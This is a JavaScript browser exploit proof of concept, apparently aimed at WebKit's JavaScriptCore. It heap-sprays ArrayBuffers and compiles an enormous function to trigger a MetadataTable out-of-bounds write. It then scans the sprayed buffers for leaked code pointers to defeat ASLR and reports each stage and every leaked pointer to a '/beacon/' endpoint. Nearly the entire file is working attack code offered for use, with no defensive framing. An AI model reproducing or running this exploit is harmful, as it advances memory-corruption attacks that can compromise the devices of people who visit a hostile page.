// p154 — MetadataTable overflow ASLR leak (NO HOLES version)
//
// Alternative to p153: no bait-and-switch. Just spray then compile.
// The 4.3GB forward sweep covers a massive range.
// Any spray buffer at a higher address than the MetadataTable gets hit.
//
// Beacon prefix: V154-

(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      var u = '/beacon/V154-' + tag;
      if (body) u += '/' + encodeURIComponent(String(body).substring(0, 600));
      x.open('GET', u + '?t=' + Date.now(), true);
      x.send();
    } catch (e) {}
  }
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V154-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function anyNonZero(view, off, len) {
    for (var b = 0; b < len; b++) { if (view[off + b] !== 0) return true; }
    return false;
  }

  BS('BOOT');

  // Phase 1: Spray — 500 buffers, NO freeing, NO holes
  // Use multiple sizes to maximize coverage in marge bitfit pages
  var SPRAY_A = 200; // 100112 bytes (MetadataTable size)
  var SPRAY_B = 200; // 65536 bytes (MarkedSpace block size)
  var SPRAY_C = 100; // 131072 bytes (2x MarkedSpace)
  var BUF_A = 100112;
  var BUF_B = 65536;
  var BUF_C = 131072;

  var views = [];
  var sizes = [];

  BS('SPRAY-START');
  for (var i = 0; i < SPRAY_A; i++) {
    var v = new Uint8Array(new ArrayBuffer(BUF_A));
    views.push(v);
    sizes.push(BUF_A);
  }
  BS('SPRAY-A-' + SPRAY_A);

  for (var i = 0; i < SPRAY_B; i++) {
    var v = new Uint8Array(new ArrayBuffer(BUF_B));
    views.push(v);
    sizes.push(BUF_B);
  }
  BS('SPRAY-B-' + SPRAY_B);

  for (var i = 0; i < SPRAY_C; i++) {
    var v = new Uint8Array(new ArrayBuffer(BUF_C));
    views.push(v);
    sizes.push(BUF_C);
  }
  BS('SPRAY-C-' + SPRAY_C);

  // Phase 2: Compile 38M function — MetadataTable goes wherever libpas puts it
  // The 4.3GB sweep goes forward from MetadataTable base
  // Some spray buffers should be in the sweep path
  var N = 38348816;
  BS('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p154fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p154ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  var blobMB = Math.round(blob.size / 1048576);
  BS('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p154ok ? 'OK' : 'FAIL';
    BS('COMPILED-' + ok);
    if (ok === 'OK') setTimeout(phaseScan, 100);
    else BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;

  // Phase 3: Scan ALL spray buffers for OOB writes
  function phaseScan() {
    BS('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;
    var leakedPtrs = [];

    for (var i = 0; i < views.length; i++) {
      var view = views[i];
      if (!view) continue;
      var sz = sizes[i];

      // Quick scan: check 8-byte chunks at stride 112 for entry+24 (thunk pointer)
      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < sz; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (hitBufs <= 5) {
          BS('HIT-' + i + '-sz' + sz + '-nz' + nz + '-f' + firstOff);
        }

        // Scan at 112-byte stride for thunk pointer at entry+24
        var entryBase = firstOff - (firstOff % 112);
        var ptrsDumped = 0;
        for (var entryOff = entryBase; entryOff + 72 <= sz && ptrsDumped < 5; entryOff += 112) {
          var ptrOff = entryOff + 24;
          if (ptrOff + 8 > sz) break;
          if (!anyNonZero(view, ptrOff, 8)) continue;

          var hex = readHex8(view, ptrOff);
          B('THUNK-' + i + '-O' + ptrOff + '=' + hex);
          ptrsDumped++;
          if (leakedPtrs.length < 5) leakedPtrs.push(hex);
        }

        // First hit: raw dump
        if (hitBufs === 1) {
          var chunks = '';
          var cc = 0;
          for (var off = firstOff; off + 8 <= sz && cc < 20; off += 8) {
            if (anyNonZero(view, off, 8)) {
              chunks += off + ':' + readHex8(view, off) + ' ';
              cc++;
            }
          }
          if (cc > 0) B('RAW-' + i, chunks.trim());
        }
      }
    }

    BS('RESULT-bufs' + hitBufs + '-nz' + totalNZ + '-total' + views.length);

    if (hitBufs > 0 && leakedPtrs.length > 0) {
      BS('ASLR-LEAK');
      for (var p = 0; p < leakedPtrs.length; p++) {
        B('PTR' + p + '=' + leakedPtrs[p]);
      }
    } else {
      BS('NO-LEAK');
    }

    BS('DONE');
  }
})();
